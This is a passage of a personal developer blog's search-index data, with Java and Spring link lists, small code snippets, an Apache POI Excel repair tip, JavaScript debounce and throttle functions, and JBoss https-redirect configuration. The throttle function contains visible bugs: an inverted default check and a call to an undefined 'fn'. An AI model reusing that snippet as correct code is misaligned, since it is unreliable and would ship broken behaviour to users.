id=\"Hibernate\"><a href=\"#Hibernate\" class=\"headerlink\" title=\"Hibernate\"></a>Hibernate</h2><p><a href=\"https://juejin.im/post/5a64773ef265da3e2b168426\" target=\"_blank\" rel=\"noopener\">Hibernate第一篇【介绍Hibernate，简述ORM，快速入门】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6477186fb9a01ca10b02a4\" target=\"_blank\" rel=\"noopener\">Hibernate第二篇【API讲解、执行流程图】 - 掘金</a><br><a href=\"https://juejin.im/post/5a64771ef265da3e2a0db002\" target=\"_blank\" rel=\"noopener\">Hibernate第三篇【主配置文件、映射文件、复合主键映射】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476ab6fb9a01c95263107\" target=\"_blank\" rel=\"noopener\">Hibernate第五篇【inverse、cascade属性详解】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476c5f265da3e36415c2c\" target=\"_blank\" rel=\"noopener\">Hibernate第六篇【多对多映射、一对一映射】 - 掘金</a><br><a href=\"https://juejin.im/post/5a64773a51882573336625f5\" target=\"_blank\" rel=\"noopener\">Hibernate第七篇【对象状态、一级缓存】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476ea51882573256be7ae\" target=\"_blank\" rel=\"noopener\">Hibernate第八篇【懒加载】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6477196fb9a01c96583d5a\" target=\"_blank\" rel=\"noopener\">Hibernate第九篇【组件映射、继承映射】 - 掘金</a><br><a href=\"https://juejin.im/post/5a647712518825733c142733\" target=\"_blank\" rel=\"noopener\">Hibernate第十篇【Hibernate查询详解、分页查询】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476f1f265da3e5b32e632\" target=\"_blank\" rel=\"noopener\">Hibernate第十一篇【配置C3P0数据库连接池、线程Session】 - 掘金</a><br><a href=\"https://juejin.im/post/5a6476a9f265da3e484beb53\" target=\"_blank\" rel=\"noopener\">Hibernate第十二篇【二级缓存介绍、缓存策略、查询缓存、集合缓存】 - 掘金</a></p>\n<h3 id=\"Hibernate占位符问题-use-named-parameters-or-JPA-style-positional-parameters-instead\"><a href=\"#Hibernate占位符问题-use-named-parameters-or-JPA-style-positional-parameters-instead\" class=\"headerlink\" title=\"Hibernate占位符问题[use named parameters or JPA-style positional parameters instead.]\"></a>Hibernate占位符问题[use named parameters or JPA-style positional parameters instead.]</h3><p><a href=\"https://blog.csdn.net/wangpeng047/article/details/12042051\" target=\"_blank\" rel=\"noopener\">Hibernate占位符问题[use named parameters or JPA-style positional parameters instead.]<em>Java</em>鹏霄万里展雄飞-CSDN博客</a></p>\n<h3 id=\"OpenSessionInViewFilter\"><a href=\"#OpenSessionInViewFilter\" class=\"headerlink\" title=\"OpenSessionInViewFilter\"></a>OpenSessionInViewFilter</h3><ul>\n<li><a href=\"https://www.cnblogs.com/ZhuRenWang/p/4708973.html\" target=\"_blank\" rel=\"noopener\">[转]Spring配置之OpenSessionInViewFilter - yunlvrensheng - 博客园</a></li>\n<li><a href=\"https://www.cnblogs.com/hwaggLee/p/5604095.html\" target=\"_blank\" rel=\"noopener\">ssh中org.springframework.orm.hibernate4.support.OpenSessionInViewFilter的作用及配置 - 243573295 - 博客园</a></li>\n</ul>\n<h2 id=\"其他為整理\"><a href=\"#其他為整理\" class=\"headerlink\" title=\"其他為整理\"></a>其他為整理</h2><p><a href=\"https://blog.csdn.net/qq_34262794/article/details/80380566\" target=\"_blank\" rel=\"noopener\">thymeleaf的下拉框(select option)回显选中<em>Java</em>皮皮鹏的博客-CSDN博客</a><br><a href=\"https://www.itread01.com/content/1544703608.html\" target=\"_blank\" rel=\"noopener\">Struts2 和 springMVC 的區別 - IT閱讀</a><br><a href=\"https://codertw.com/%E7%A8%8B%E5%BC%8F%E8%AA%9E%E8%A8%80/435210/\" target=\"_blank\" rel=\"noopener\">Struts2 Spring Hibernate的工作流程及原理(整理的) | 程式前沿</a><br><a href=\"http://tw.gitbook.net/struts_2/struts-2-download-file-example.html\" target=\"_blank\" rel=\"noopener\">Struts2下載文件實例 - Struts2基礎教程</a><br><a href=\"https://mkyong.com/java/how-to-generate-serialversionuid/\" target=\"_blank\" rel=\"noopener\">Java : How to generate serialVersionUID – Mkyong.com</a><br><a href=\"https://www.cnblogs.com/yaojf/p/9852802.html\" target=\"_blank\" rel=\"noopener\">关于tomcat WEB-INF/lib下类加载顺序 - 四少啊 - 博客园</a><br><a href=\"https://www.itread01.com/content/1505151616.html\" target=\"_blank\" rel=\"noopener\">struts2對json的支持 - IT閱讀</a><br><a href=\"https://juejin.im/post/5bc6a1c6f265da0acf0b102e\" target=\"_blank\" rel=\"noopener\">SpringApplication你不知道的那些事！ - 掘金</a><br><a href=\"https://matthung0807.blogspot.com/2019/04/spring-configuration_28.html\" target=\"_blank\" rel=\"noopener\">菜鳥工程師 肉豬: Spring @Configuration作用</a><br><a href=\"https://sites.google.com/site/stevenattw/java/spring-framework/ioc---annotation-configuration\" target=\"_blank\" rel=\"noopener\">IoC - Annotation (@Configuration) - 史帝芬心得筆記</a><br><a href=\"https://matthung0807.blogspot.com/2019/08/spring-boot-properties-file-value.html\" target=\"_blank\" rel=\"noopener\">菜鳥工程師 肉豬: Spring Boot properties file value injection 屬性配置檔注入</a><br><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@SpringBootApplication</span></span><br><span class=\"line\"><span class=\"meta\">@PropertySource</span>(</span><br><span class=\"line\">    value = &#123; <span class=\"string\">\"classpath:my-messages.properties\"</span>, <span class=\"string\">\"classpath:other-messages.properties\"</span> &#125;, </span><br><span class=\"line\">    ignoreResourceNotFound = <span class=\"keyword\">true</span>,</span><br><span class=\"line\">    encoding = <span class=\"string\">\"UTF-8\"</span></span><br><span class=\"line\">)</span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">DemoApplication</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        ApplicationContext appCtx = SpringApplication.run(DemoApplication.class, args);</span><br><span class=\"line\">        </span><br><span class=\"line\">        MyMessages myMessages = appCtx.getBean(MyMessages.class);</span><br><span class=\"line\">        OtherMessages otherMessages = appCtx.getBean(OtherMessages.class);</span><br><span class=\"line\">        </span><br><span class=\"line\">        myMessages.printPropertiesValue();</span><br><span class=\"line\">        </span><br><span class=\"line\">        System.out.println(<span class=\"string\">\"-----------------------\"</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        otherMessages.printPropertiesValue();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://www.yiibai.com/spring-boot/spring_boot_beans_and_dependency_injection.html\" target=\"_blank\" rel=\"noopener\">Spring Boot Bean和依赖注入 - Spring Boot教程™</a><br><a href=\"https://www.javazhiyin.com/28012.html\" target=\"_blank\" rel=\"noopener\">Springboot2教程：@SpringBootApplication自动配置-Java知音</a><br><a href=\"https://www.imooc.com/article/16155\" target=\"_blank\" rel=\"noopener\">整合Spring时Service层为什么不做全局包扫描详解_慕课手记</a><br><a href=\"https://www.hellojava.com/a/25881.html\" target=\"_blank\" rel=\"noopener\">用最简单的语言来告诉你:SpringMVC中@Controller,@Service,@repository,@Component的用法 - HelloJava菜鸟社区</a><br><a href=\"https://zhuanlan.zhihu.com/p/24429133\" target=\"_blank\" rel=\"noopener\">构建工具的进化：ant, maven, gradle - 知乎</a><br><a href=\"https://mp.weixin.qq.com/s?__biz=MzI4Njg5MDA5NA==&amp;mid=2247484222&amp;idx=1&amp;sn=5191aca33f7b331adaef11c5e07df468&amp;chksm=ebd7423fdca0cb29cdc59b4c79afcda9a44b9206806d2212a1b807c9f5879674934c37c250a1#rd\" target=\"_blank\" rel=\"noopener\">给女朋友讲解什么是代理模式</a><br><a href=\"https://blog.csdn.net/zbdxcyg/article/details/71440729\" target=\"_blank\" rel=\"noopener\">解决错误The type List is not generic; it cannot be parameterized with arguments <em>Java</em>瓜爪牛的博客-CSDN博客</a></p>\n<h2 id=\"Annotation\"><a href=\"#Annotation\" class=\"headerlink\" title=\"Annotation\"></a>Annotation</h2><p><a href=\"https://blog.csdn.net/lylwo317/article/details/52163304\" target=\"_blank\" rel=\"noopener\">Java注解（Annotation）原理详解<em>Java</em>心中要有一片海的专栏-CSDN博客</a><br><a href=\"https://www.jianshu.com/p/28edf5352b63\" target=\"_blank\" rel=\"noopener\">Java:Annotation(注解)–原理到案例 - 簡書</a><br><a href=\"https://my.oschina.net/itblog/blog/1525665\" target=\"_blank\" rel=\"noopener\">关于Java的Retention元注解 - 摆渡者 - OSCHINA</a><br><a href=\"https://zhuanlan.zhihu.com/p/56713785\" target=\"_blank\" rel=\"noopener\">Java 注解之 元注解 - 知乎</a> <a href=\"/blog/2020/03/28/Java-雜記/web2.png\" title=\"備份圖\">備份圖</a><br>裡面講的還滿細的!!</p>\n<h2 id=\"JAXRS\"><a href=\"#JAXRS\" class=\"headerlink\" title=\"JAXRS\"></a>JAXRS</h2><p><a href=\"https://stackoverflow.com/questions/42944777/difference-between-jax-rs-and-spring-rest\" target=\"_blank\" rel=\"noopener\">jersey - Difference between JAX-RS and Spring Rest - Stack Overflow</a></p>\n<p><a href=\"https://www.infoq.cn/article/springmvc_jsx-rs\" target=\"_blank\" rel=\"noopener\">Spring MVC与JAX-RS比较与分析 - InfoQ</a></p>\n<p>spring version<br><a href=\"https://docs.spring.io/spring/docs/3.0.x/spring-framework-reference/html/new-in-3.html\" target=\"_blank\" rel=\"noopener\">2. New Features and Enhancements in Spring 3.0</a><br><a href=\"https://pclevinblog.pixnet.net/blog/post/314562535-spring-3.2.2%E7%9A%84%E5%90%84%E9%A1%9Ejar%E8%AA%AA%E6%98%8E\" target=\"_blank\" rel=\"noopener\">[JAVA_Spring]Spring 3.2.2的各類jar說明 @ 程式開發學習之路 :: 痞客邦 ::</a><br><a href=\"http://javabruce.blogspot.com/2016/02/hibernate4x-spring3x.html\" target=\"_blank\" rel=\"noopener\">Blog of Bruce: Hibernate 4.x 整合 Spring 3.x</a></p>\n<p><a href=\"https://kknews.cc/zh-tw/code/gzvy35y.html\" target=\"_blank\" rel=\"noopener\">Spring：3大核心版本簡介、maven與Spring4構建工程、代碼實戰 - 每日頭條</a><br><a href=\"https://www.iteye.com/blog/jinnianshilongnian-1989381\" target=\"_blank\" rel=\"noopener\">Spring4新特性——Web开发的增强 - 《亿级流量网站架构核心技术》~ - ITeye博客</a><br><a href=\"https://juejin.im/post/5c6509d9f265da2dd37c0397\" target=\"_blank\" rel=\"noopener\">Spring 5.x 新特性 - 掘金</a></p>\n<h2 id=\"SLF4J\"><a href=\"#SLF4J\" class=\"headerlink\" title=\"SLF4J\"></a>SLF4J</h2><p><a href=\"https://www.jianshu.com/p/32e2a7254c03\" target=\"_blank\" rel=\"noopener\">SLF4J使用和与Log4J对比 - 簡書</a></p>\n<h2 id=\"java-class-list\"><a href=\"#java-class-list\" class=\"headerlink\" title=\"java class list\"></a>java class list</h2><p><a href=\"https://stackoverflow.com/questions/2548384/java-get-a-list-of-all-classes-loaded-in-the-jvm\" target=\"_blank\" rel=\"noopener\">reflection - Java - Get a list of all Classes loaded in the JVM - Stack Overflow</a></p>\n<p>JAVA_OPTS=”$JAVA_OPTS -verbose:class”</p>\n<h2 id=\"ejb\"><a href=\"#ejb\" class=\"headerlink\" title=\"ejb\"></a>ejb</h2><p><a href=\"https://openhome.cc/Gossip/EJB3Gossip/index.html\" target=\"_blank\" rel=\"noopener\">語言技術: EJB3 Gossip</a><br><a href=\"http://newgoodlooking.pixnet.net/blog/post/125466267\" target=\"_blank\" rel=\"noopener\">[轉] EJB 3和Spring技術體系比較 - yjmyzz @ IT工程師數位筆記本 :: 痞客邦 ::</a><br> <a href=\"https://blog.xuite.net/jialiang/programs/39229990-%E7%B0%A1%E5%96%AE%E9%8B%AA%E8%A8%ADEnterprise+Java+Bean%28EJB%29%E7%9A%84%E6%9E%B6%E6%A7%8B\" target=\"_blank\" rel=\"noopener\">簡單鋪設Enterprise Java Bean(EJB)的架構 @ 資訊迴圈 :: 隨意窩 Xuite日誌</a></p>\n <figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java ee基本是在企業裡用的，你編程以前，要配置一大堆xml這樣子，很可能會是javaee</span><br><span class=\"line\">java se基本都用在學校，教學，科學實驗這些，配置個maven就了不起了</span><br><span class=\"line\">java me就是沒人用的那些...</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://www.zhihu.com/question/31455874\" target=\"_blank\" rel=\"noopener\">java ee , java se, java me 怎麼區分? - 知乎</a><br><a href=\"https://leoyeh.me/2016/10/15/Spring-%E4%B8%8A%E8%AA%B2%E7%AD%86%E8%A8%98-2/\" target=\"_blank\" rel=\"noopener\">Spring 上課筆記 (2) | Leo Yeh’s Blog</a></p>\n<h2 id=\"sitemesh\"><a href=\"#sitemesh\" class=\"headerlink\" title=\"sitemesh\"></a>sitemesh</h2><p><a href=\"https://jemmywalker.pixnet.net/blog/post/38324103?m=on//////\" target=\"_blank\" rel=\"noopener\">SiteMesh初體驗 @ Jemmy Walker :: 痞客邦 ::</a><br><a href=\"https://stackoverflow.com/questions/3197370/sitemesh-still-active-v2-vs-v3\" target=\"_blank\" rel=\"noopener\">java - SiteMesh - still active? v2 vs v3? - Stack Overflow</a><br><a href=\"https://blog.csdn.net/u010246789/article/details/52343526\" target=\"_blank\" rel=\"noopener\">[页面模板框架对比] Apache Tiles VS Sitemesh_Java_孤天浪雨-CSDN博客</a><br><a href=\"https://www.cnblogs.com/jersey/archive/2011/04/10/2011244.html\" target=\"_blank\" rel=\"noopener\">Struts2 使用SiteMesh做网页布局 - Jersey - 博客园</a></p>\n<h2 id=\"JNDI\"><a href=\"#JNDI\" class=\"headerlink\" title=\"JNDI\"></a>JNDI</h2><p><a href=\"https://stackoverflow.com/questions/734614/spring-hibernate-junit-no-hibernate-session-bound-to-thread\" target=\"_blank\" rel=\"noopener\">Spring / Hibernate / JUnit - No Hibernate Session bound to Thread - Stack Overflow</a></p>\n<p><a href=\"https://javatoybox.blogspot.com/2018/09/jndi-derby-tomee-plus.html\" target=\"_blank\" rel=\"noopener\">放棄思考: JNDI + Derby + TomEE Plus 教學</a></p>\n<h2 id=\"ReflectionToStringBuilder\"><a href=\"#ReflectionToStringBuilder\" class=\"headerlink\" title=\"ReflectionToStringBuilder\"></a>ReflectionToStringBuilder</h2><p><a href=\"https://blog.csdn.net/Darrensty/article/details/78395221\" target=\"_blank\" rel=\"noopener\">ReflectionToStringBuilder用法优缺点及一个问题和分享_Darrensty的博客-CSDN博客_reflectiontostringbuilder</a></p>\n<h2 id=\"Pretty-Print-JSON-in-Java\"><a href=\"#Pretty-Print-JSON-in-Java\" class=\"headerlink\" title=\"Pretty-Print JSON in Java\"></a>Pretty-Print JSON in Java</h2><p>GSON</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">Gson gson = <span class=\"keyword\">new</span> GsonBuilder().setPrettyPrinting().create();</span><br><span class=\"line\">JsonParser jp = <span class=\"keyword\">new</span> JsonParser();</span><br><span class=\"line\">JsonElement je = jp.parse(uglyJSONString);</span><br><span class=\"line\">String prettyJsonString = gson.toJson(je);</span><br></pre></td></tr></table></figure>\n<p>存 Java</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">JSONObject json = <span class=\"keyword\">new</span> JSONObject(jsonString); <span class=\"comment\">// Convert text to object</span></span><br><span class=\"line\">System.out.println(json.toString(<span class=\"number\">4</span>)); <span class=\"comment\">// Print it with specified indentation</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"抓取檔案位置\"><a href=\"#抓取檔案位置\" class=\"headerlink\" title=\"抓取檔案位置\"></a>抓取檔案位置</h2><p>抓取編譯檔案</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\">getClass().getClassLoader().getResource(<span class=\"string\">\"main/resources/simple/xxx.xlsx\"</span>).getFile();</span><br></pre></td></tr></table></figure>\n<p>讀取程式執行路徑</p>\n<p>1</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">return</span> <span class=\"keyword\">new</span> File(MyClass.class.getProtectionDomain().getCodeSource().getLocation()</span><br><span class=\"line\">    .toURI()).getPath();</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://stackoverflow.com/questions/320542/how-to-get-the-path-of-a-running-jar-file\" target=\"_blank\" rel=\"noopener\">java - How to get the path of a running JAR file? - Stack Overflow</a></p>\n<h2 id=\"Procedure\"><a href=\"#Procedure\" class=\"headerlink\" title=\"Procedure\"></a>Procedure</h2><ul>\n<li><a href=\"https://stackoverflow.com/questions/46051642/can-i-rollback-after-calling-stored-procedure-in-java-test\" target=\"_blank\" rel=\"noopener\">oracle - Can I rollback after calling stored procedure in java test? - Stack Overflow</a></li>\n<li><a href=\"https://blog.darkthread.net/blog/async-batch-update-performance/\" target=\"_blank\" rel=\"noopener\">使用非同步處理提升資料庫更新速度-黑暗執行緒</a></li>\n<li><a href=\"https://medium.com/@allaboutdataanalysis/%E5%AF%AB%E5%A5%BDsql%E5%BE%88%E6%9C%89%E5%BF%85%E8%A6%81-3206014d5422\" target=\"_blank\" rel=\"noopener\">寫好SQL很有必要！ - 數據分析那些事 - Medium</a></li>\n<li><a href=\"http://dboffat.blogspot.com/2017/04/?m=1\" target=\"_blank\" rel=\"noopener\">阿肥的DB學習之路: 四月 2017</a></li>\n</ul>\n<p>RxJava2+ Retrofit2</p>\n<ul>\n<li><a href=\"https://tpu.thinkpower.com.tw/tpu/articleDetails/1306\" target=\"_blank\" rel=\"noopener\">RxJava2+ Retrofit2 簡介</a></li>\n</ul>\n<p><a href=\"https://segmentfault.com/q/1010000018530184/a-1020000018530356?sort=created\" target=\"_blank\" rel=\"noopener\">java web中po 和dto之间的使用 - 的回答 - SegmentFault 思否</a><br><a href=\"https://iambigboss.top/post/59663_1_1.html\" target=\"_blank\" rel=\"noopener\">项目结构介绍-博客</a><br><a href=\"http://www.360doc.cn/article/15242507_435666535.html\" target=\"_blank\" rel=\"noopener\">PO BO VO DTO POJO DAO 概念及其作用（附转换图）</a><br><a href=\"http://onthink.com/2018/07/22/alibaba-models/\" target=\"_blank\" rel=\"noopener\">数据模型 - 阿里规约（1） | Ironbin</a></p>\n<p>基礎於：Java、Amazon AWS，進行：開發，測試，佈署（Code / Infra），維運。<br>Spring MVC Framework的Servlet Container 應用服務開發。<br>Vert.X 或 Micronaut 的微服務Microservices開發。<br>The Reactive Manifesto的Reactive Friendly程式撰寫風格（Plus)。 </p>\n<p> 基礎於：Java、Amazon AWS，進行：開發，測試，佈署（Code / Infra），維運。<br>Spring MVC Framework的Servlet Container 應用服務開發。<br>Vert.X 或 Micronaut 的微服務Microservices開發。<br>Apache Kafka的事件及訊息驅動應用開發。<br>The Reactive Manifesto的Reactive Friendly程式撰寫風格（Plus)。<br>Cloudformation 腳本撰寫。<br>懂或有意願學習：Jenkins + CodePipeline 腳本撰寫經驗。<br>協助導入及實作AWS及On Premises 混合雲</p>\n","categories":["Java"],"tags":["spring","java","struts2"]},{"title":"Java操作POI修改報表sample檔發生信任活頁簿問題","url":"/blog/2018/09/18/Java%E6%93%8D%E4%BD%9CPOI%E4%BF%AE%E6%94%B9%E5%A0%B1%E8%A1%A8sample%E6%AA%94%E7%99%BC%E7%94%9F%E4%BF%A1%E4%BB%BB%E6%B4%BB%E9%A0%81%E7%B0%BF%E5%95%8F%E9%A1%8C/","content":"<p>最近使用Java做報表，產生出來資料正確<br>但開啟會跳出奇怪的東西<br>後來是要開rar把一個資料刪除sample檔就順利<br>簡單紀錄</p>\n<a id=\"more\"></a>\n<p>程式報表處理是這樣的</p>\n<ol>\n<li>讀取Excel SAMPLE檔案</li>\n<li>寫入Excel資料</li>\n<li>另存新檔到xxxx.xlsx</li>\n</ol>\n<p>今天就是改Excel  SAMPLE檔案存檔<br>程式順利執行執行<br>但是跳出錯誤訊息</p>\n<img src=\"/blog/2018/09/18/Java操作POI修改報表sample檔發生信任活頁簿問題/1.jpg\" title=\"Excel 錯誤訊息1\">\n<img src=\"/blog/2018/09/18/Java操作POI修改報表sample檔發生信任活頁簿問題/2.jpg\" title=\"Excel 錯誤訊息2\">\n<p>雖然會自動修復…，但每次產生新報表這樣也很麻煩</p>\n<img src=\"/blog/2018/09/18/Java操作POI修改報表sample檔發生信任活頁簿問題/3.jpg\" title=\"用rar開啟sample.xlsx檔案刪除calcChain.xml\">\n<p>用rar開啟sample.xlsx檔案刪除calcChain.xml<br>後來副理跟我說要故這個才能解決。</p>\n<p>不知道是什麼原因才造成的<br>先筆記</p>\n","categories":["寫程式一些事"],"tags":["java","POI"]},{"title":"JavaScript 效能優化 Debounce 和 Throttle 小記","url":"/blog/2019/07/05/JavaScript-%E6%95%88%E8%83%BD%E5%84%AA%E5%8C%96-Debounce-%E5%92%8C-Throttle-%E5%B0%8F%E8%A8%98/","content":"<p>之前在看 Vue 範例就看到有這個 Debounce 函式運用<br>就很想做這個筆記<br>不過，今天同事有一個同時間觸發同一個 Event<br>最後想起一個 workaround 解決方式</p>\n<a id=\"more\"></a>\n<p>首先，這個一般可以用 jQuery off 方式關掉全部的 Event<br>但這個也不是萬靈丹<br>在某種情況下還是無法用<br>這時候想到這個也能解決這個問題</p>\n<p>不過因為他那個按鈕(開關套件)，不能同時按，因為有做 AJAX 關係<br>所以要用 ajax disabled 那個物件，completed 可以 enable<br>就能防止 bug<br>但能不要用這種方式最好</p>\n<p>首先，記錄兩個差異<br>Debounce 主要用在事件處發，當下點下去第一下才會處發，後面幾毫秒不會觸發<br>Thtrottle 主要用在多次刷新，但是不需要太頻繁，通常用在做動畫上面</p>\n<h2 id=\"Debounce\"><a href=\"#Debounce\" class=\"headerlink\" title=\"Debounce\"></a>Debounce</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">debounce</span>(<span class=\"params\">func, delay</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> timer = <span class=\"literal\">null</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> context = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    clearTimeout(timer);</span><br><span class=\"line\">    timer = setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">      func.apply(context, args);</span><br><span class=\"line\">    &#125;, delay);</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>簡單講就是設定</p>\n<h2 id=\"Throttle\"><a href=\"#Throttle\" class=\"headerlink\" title=\"Throttle\"></a>Throttle</h2><figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">throttle</span>(<span class=\"params\">func, threshhold</span>) </span>&#123;</span><br><span class=\"line\">  <span class=\"keyword\">var</span> last, timer;</span><br><span class=\"line\">  <span class=\"keyword\">if</span> (threshhold) threshhold = <span class=\"number\">250</span>;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> <span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> context = <span class=\"keyword\">this</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> args = <span class=\"built_in\">arguments</span>;</span><br><span class=\"line\">    <span class=\"keyword\">var</span> now = +<span class=\"keyword\">new</span> <span class=\"built_in\">Date</span>();</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (last &amp;&amp; now &lt; last + threshhold) &#123;</span><br><span class=\"line\">      clearTimeout(timer);</span><br><span class=\"line\">      timer = setTimeout(<span class=\"function\"><span class=\"keyword\">function</span>(<span class=\"params\"></span>) </span>&#123;</span><br><span class=\"line\">        last = now;</span><br><span class=\"line\">        func.apply(context, args);</span><br><span class=\"line\">      &#125;, threshhold);</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      last = now;</span><br><span class=\"line\">      fn.apply(context, args);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><a href=\"https://mropengate.blogspot.com/2017/12/dom-debounce-throttle.html\" target=\"_blank\" rel=\"noopener\">網頁 DOM 事件的效能優化：Debounce 和 Throttle | Mr. Opengate</a> <br><a href=\"https://zhuanlan.zhihu.com/p/52249747\" target=\"_blank\" rel=\"noopener\">JS 专题之节流函数 - 知乎</a></p>\n<h2 id=\"第三方套件-Debounce、Throttle\"><a href=\"#第三方套件-Debounce、Throttle\" class=\"headerlink\" title=\"第三方套件 Debounce、Throttle\"></a>第三方套件 Debounce、Throttle</h2><h3 id=\"Lodash\"><a href=\"#Lodash\" class=\"headerlink\" title=\"Lodash\"></a>Lodash</h3><p>推薦使用這個!!<br><a href=\"https://lodash.com/\" target=\"_blank\" rel=\"noopener\">https://lodash.com/</a></p>\n<h3 id=\"Underscore\"><a href=\"#Underscore\" class=\"headerlink\" title=\"Underscore\"></a>Underscore</h3><p><a href=\"http://underscorejs.org/\" target=\"_blank\" rel=\"noopener\">http://underscorejs.org/</a></p>\n"},{"title":"Jboss 設定 http 導 https","url":"/blog/2021/06/02/Jboss-%E8%A8%AD%E5%AE%9A-http-%E5%B0%8E-https/","content":"<a id=\"more\"></a>\n<h2 id=\"redirect\"><a href=\"#redirect\" class=\"headerlink\" title=\"redirect\"></a>redirect</h2><p><a href=\"https://stackoverflow.com/a/43948374\" target=\"_blank\" rel=\"noopener\">https://stackoverflow.com/a/43948374</a></p>\n<p>我有測試上面網站方式，本機測試可以http導向https<br>我這邊standalone.xml 剛好預設有那些https設定，所以沒調整<br>project /WebContent/WEB-INF/web.xml 也需要加</p>\n<figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">security-constraint</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">web-resource-collection</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">web-resource-name</span>&gt;</span>WEB_APPLICATION_NAME<span class=\"tag\">&lt;/<span class=\"name\">web-resource-name</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">url-pattern</span>&gt;</span>/*<span class=\"tag\">&lt;/<span class=\"name\">url-pattern</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">web-resource-collection</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">user-data-constraint</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">transport-guarantee</span>&gt;</span>CONFIDENTIAL<span class=\"tag\">&lt;/<span class=\"name\">transport-guarantee</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">user-data-constraint</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">security-constraint</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>參考:<a href=\"https://www.cnblogs.com/maximo/p/5775627.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/maximo/p/5775627.html</a></p>\n<h2 id=\"rewrite\"><a href=\"#rewrite\" class=\"headerlink\" title=\"rewrite\"></a>rewrite</h2><p>standalone.xml<br><figure class=\"highlight xml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">subsystem</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"urn:jboss:domain:transactions:4.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">core-environment</span>&gt;</span></span><br><span class=\"line\">        <span class=\"tag\">&lt;<span class=\"name\">process-id</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">uuid</span>/&gt;</span></span><br><span class=\"line\">       <span class=\"tag\">&lt;/<span class=\"name\">process-id</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">core-environment</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">recovery-environment</span> <span class=\"attr\">socket-binding</span>=<span class=\"string\">\"txn-recovery-environment\"</span> <span class=\"attr\">status-socket-binding</span>=<span class=\"string\">\"txn-status-manager\"</span>/&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">object-store</span> <span class=\"attr\">path</span>=<span class=\"string\">\"tx-object-store\"</span> <span class=\"attr\">relative-to</span>=<span class=\"string\">\"jboss.server.data.dir\"</span>/&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">subsystem</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">subsystem</span> <span class=\"attr\">xmlns</span>=<span class=\"string\">\"urn:jboss:domain:undertow:4.0\"</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span 